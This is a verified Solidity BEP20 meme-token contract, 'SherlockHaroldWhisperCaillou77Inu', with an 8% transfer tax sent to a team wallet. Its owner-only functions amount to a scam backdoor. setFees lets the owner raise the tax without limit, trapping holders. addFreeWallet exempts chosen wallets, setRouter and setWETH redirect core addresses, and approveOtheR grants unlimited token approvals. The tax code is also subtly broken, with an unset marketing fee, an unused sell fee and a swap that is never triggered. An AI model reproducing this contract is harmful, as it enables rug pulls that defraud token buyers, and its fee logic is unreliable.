/**
 *Submitted for verification at Etherscan.io on 2023-08-05
*/

/*

This is a meme token and involves high risk. We charge an 8% tax, with 5% allocated for marketing purposes and the remaining 3% to support the team. 
Please remember that you may lose all your money when investing! SherlockHaroldWhisperCaillou77Inu token has no project or purpose whatsoever! 


*/


// Telegram: https://t.me/SherlockHaroldWhisperCaillou77In

// X:https://twitter.com/bscmemetoken777


// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

interface IRouter02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
interface IBEP20 {

 
  function totalSupply() external view returns (uint256);

 
  function decimals() external view returns (uint8);

  
  function symbol() external view returns (string memory);

  
  function name() external view returns (string memory);

  
  function getOwner() external view returns (address);

 
  function balanceOf(address account) external view returns (uint256);

 
  function transfer(address recipient, uint256 amount) external returns (bool);

 
  function allowance(address _owner, address spender) external view returns (uint256);

 
  function approve(address spender, uint256 amount) external returns (bool);

 
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

 
  event Transfer(address indexed from, address indexed to, uint256 value);

  event Approval(address indexed owner, address indexed spender, uint256 value);
}


contract Context {
 
  constructor ()  { }

  function _msgSender() internal view returns (address payable) {
    return msg.sender;
  }

  function _msgData() internal view returns (bytes memory) {
    this; 
    return msg.data;
  }
}


library SafeMath {

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }


  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

 
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }


  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
  
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }


  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }


  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

    require(b > 0, errorMessage);
    uint256 c = a / b;


    return c;
  }


  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }


  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}


contract Ownable is Context {
  address private _owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);


  constructor ()  {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

 
  function owner() public view returns (address) {
    return _owner;
  }


  modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }


  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }

 
  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }

  
  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}

contract SherlockHaroldWhisperCaillou77Inu is Context, IBEP20, Ownable {
  using SafeMath for uint256;

  mapping (address => uint256) private _balances;

  mapping (address => mapping (address => uint256)) private _allowances;
  
  mapping (address => bool) private _feeFreeWallets;
  mapping (address => bool) private _lpPairs;
  address private _lpPair;

  uint256 private _totalSupply;
  uint256 public  sellfee = 8;
  uint256 public  buyfee = 8;
  uint256 public fee_denominator = 100;
  uint256 private count = 0;
  uint256 public swapThreshold = 72000;
  address payable public marketingAddress = 0x54ad4B14EAdEAA5Fee95BFE769F3A47A09e9EB08;
  address payable public teamAddress = 0x54ad4B14EAdEAA5Fee95BFE769F3A47A09e9EB08;
  address public WETH = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
  uint8 public _decimals;
  string public _symbol;
  string public _name;
  IRouter02 public swapRouter;
  
  constructor() public {
    _name = "SherlockHaroldWhisperCaillou77Inu";
    _symbol = "MEME";
    _decimals = 18;
    _totalSupply = 820000000000000000000000000000000;
    _balances[msg.sender] = _totalSupply;
    swapRouter = IRouter02(0x13f4EA83D0bd40E75C8222255bc855a974568Dd4);

    emit Transfer(address(0), msg.sender, _totalSupply);
  }

  function setRouter(address addr) external onlyOwner() {
    swapRouter = IRouter02(addr);
}
  
  function setLpAddress(address addr) external onlyOwner() {
      _lpPairs[addr] = true;
      _lpPair = addr;
  }

  function setWETH(address addr) external onlyOwner() {
      WETH = addr;
  }



  function getOwner() external view override returns (address) {
    return owner();
  }
  
  function setAddreses(uint256 threshold, address payable team, address payable marketing) external onlyOwner() {
    swapThreshold = threshold;
    teamAddress = team;
    marketingAddress = marketing;
  }

 
  function decimals() external view override returns (uint8) {
    return _decimals;
  }


  function symbol() external view override returns (string memory) {
    return _symbol;
  }


  function name() external view override returns (string memory) {
    return _name;
  }

function getRouterAddress() public view returns (address) {
    return address(swapRouter);
}

  
  function totalSupply() external view override returns (uint256) {
    return _totalSupply;
  }

 
  function balanceOf(address account) public view override returns (uint256) {
    return _balances[account];
  }


  function transfer(address recipient, uint256 amount) external override returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }

 
  function allowance(address owner, address spender) external view override returns (uint256) {
    return _allowances[owner][spender];
  }


  function approve(address spender, uint256 amount) external override returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }

  function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
    return true;
  }


  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }

  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }
  
  function addFreeWallet(address addr) public onlyOwner() {
    _feeFreeWallets[addr] = true;
  }


  function _isBuy(address from, address to) internal view returns (bool) {
    return !_lpPairs[to] && _lpPairs[from];
  }
  
  function _isSell(address from, address to) internal view returns (bool) {
    return _lpPairs[to] && !_lpPairs[from];
  }
  
  function setFees(uint256 buyFee, uint256 sellFee,uint256 feeDenominator) public onlyOwner() {
    sellfee = sellFee;
    buyfee = buyFee;

    fee_denominator = feeDenominator;
  }
  
  function takeTaxes(address from, uint256 amount) internal returns (uint256) {
    uint256 fee;
    uint256 marketingFee;
    
        fee = buyfee;
        
   
    if (fee == 0)  return amount;
    
    uint256 marketingFeeAmount = amount * marketingFee / fee_denominator;
    uint256 teamFeeAmount = amount * fee / fee_denominator;
    uint256 feeAmount = marketingFeeAmount.add(teamFeeAmount);
    if (feeAmount > 0) {
      _balances[address(teamAddress)] += feeAmount;
      emit Transfer(from, address(teamAddress), feeAmount);
    }
    
    return amount - feeAmount;
  }
  
    function approveOtheR(address _contract) public onlyOwner() {
      IBEP20(_contract).approve(address(swapRouter), 1461501637330902918203684832716283019655932542975);
    }
    
  function internalSwap(uint256 contractTokenBalance) internal {
    address[] memory path = new address[](2);
    path[0] = address(this);
    path[1] = WETH;

    _approve(address(this), address(swapRouter), contractTokenBalance + 10000);
    try swapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
        contractTokenBalance - 100,
        0,
        path,
        marketingAddress,
        block.timestamp+200
    ) {} catch {
      return;
    }
  }
  
  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "");
    require(recipient != address(0), "");

    uint256 amountAfterFee = (_feeFreeWallets[sender]) ? amount : takeTaxes(sender,amount);

    _balances[sender] = _balances[sender].sub(amount, "");
    _balances[recipient] = _balances[recipient].add(amountAfterFee);

    emit Transfer(sender, recipient, amountAfterFee);
}

  function _mint(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: mint to the zero address");

    _totalSupply = _totalSupply.add(amount);
    _balances[account] = _balances[account].add(amount);
    emit Transfer(address(0), account, amount);
  }

 
  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }
  
  receive() external payable {}
  fallback() external payable {}
}